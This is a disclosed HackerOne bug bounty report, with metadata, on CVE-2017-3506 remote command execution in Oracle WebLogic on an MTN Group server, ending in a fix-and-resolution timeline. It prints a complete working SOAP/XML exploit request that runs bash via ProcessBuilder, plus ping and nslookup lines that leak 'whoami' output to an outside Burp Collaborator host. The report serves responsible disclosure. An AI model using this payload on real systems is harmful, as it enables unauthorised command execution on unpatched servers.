---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2021-04-25
submitted: 2020-03-04T14:20:40.692Z
bounty_usd: null
votes: 25
cve: "CVE-2017-3506"
program: "[[programs/mtn_group|MTN Group]]"
reporter: "tounsi_007"
source: "https://hackerone.com/reports/810778"
title: "Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-3506]"
---
# Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-3506]

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 25 | **Program:** MTN Group | **Disclosed:** 2021-04-25

- Report: [https://hackerone.com/reports/810778](https://hackerone.com/reports/810778)
- CWE: OS Command Injection | CVE: CVE-2017-3506
- Submitted: 2020-03-04T14:20:40.692Z

## Report summary

## CVE-2017-3506 :
>
* Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: Web Services). Supported versions that are affected are 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1 and 12.2.1.2. Difficult to exploit vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle WebLogic Server accessible data as well as unauthorized access to critical data or complete access to all Oracle WebLogic Server accessible data.
>

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

##Summary

Hello. I was able to identify RCE vulnerability due to the outdated Oracle Weblogic instance on `https://raebilling.mtn.co.za`.

##Steps To Reproduce

* To reproduce, try this request with BurpSuite 
* This request to the `https://raebilling.mtn.co.za/wls-wsat/RegistrationRequesterPortType` will trigger Remote OS Command Execution:

```
POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1
Host: raebilling.mtn.co.za
Content-Type: text/xml
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0,
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,
Accept-Languag: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3,
Content-Type: text/xml;charset=UTF-8
Content-Length: 873

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
        <void index="2">
                  <string>ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
```
==**Note:**== 
* **To reproduce this case with nslookup or ping, `fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net` host should be replaced by your own Burp Collaborator instance or with your private `VPS IP` to catch the DNS request**

##_**Example:**_

``` 
ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net
nslookup `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net
```
==**POC:**== {F736973}

## Suggested Mitigation/Remediation Actions
* Patching WebLogic to the recent version will fix the issue.

## Impact

**This vulnerability allow an unauthenticated attacker:**
* To perform Remote OS Command Execution

## Timeline

- **Report Filed**
- **Report Triaged**
- **2020-04-01** @tounsi_007: Greetings,
@vancora
* Any updates.

Thank you
- **2020-04-02** @vancora: This was fixed, kindly validate on your side.
- **2020-04-02** @tounsi_007: hi @vancora,
>
**Yes, i validated that was fixed.**
>

**==POC:==** {F770967}
- **2020-04-03** @tounsi_007: Greetings,
@vancora
>
* Please can you change the status to Resolved.
>

Thank you
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
